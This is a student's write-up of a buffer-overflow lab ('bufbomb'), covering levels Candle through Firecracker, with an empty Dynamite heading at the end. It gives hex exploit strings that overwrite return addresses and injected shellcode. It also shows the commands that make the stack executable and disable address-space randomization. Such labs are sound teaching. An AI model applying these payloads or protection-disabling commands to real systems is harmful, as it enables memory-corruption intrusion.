# Lab 3
## level 0: Candle
Get address of smoke `08048e20 <smoke>:`.

There is 12 bytes of space for `char buf[12]`, and 4 bytes for `saved ebp`, so we need 16 bytes of padding before smoke address. Remember to use litte-endian.

`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 8e 04 08`

## level 1: Sparkler

In this level, we need to set the parameter of function `fizz(int val)`. 

The pattern should be:
`[16 byte padding to overflow]`+`[fizz addr]`+`[4 byte padding for return address]`+`[cookie]`

So we get:
`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 8d 04 08 00 00 00 00 f1 0c 6f 46`

## level 2: Firecracker

Have to allow execstack for `bufbomb`.

```
execstack -s bufbomb
```

Look into asm code. `bang()` reads `global_val` with `0x804a1dc`. And function address is `08048d60`.

We can use this asm code to attack.
```
movl $0x466f0cf1,0x804a1dc      # global_value = cookie
push $0x08048d60                # return to bang
ret
```

We also need to know the address of this attacking code, lets put it at `buf[24]`. And the address would be `0xffffb554`

So out input is:
`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 54 b5 ff ff 00 00 00 00 c7 04 25 dc a1 04 08 f1 0c 6f 46 68 60 8d 04 08 c3`


Here we successfully attacked in gdb mode, but directly execute will cause a segmentation fault.

Need to disable randomization of the kernel.
`sudo sysctl -w kernel.randomize_va_space=0`

## level 3: Dynamite

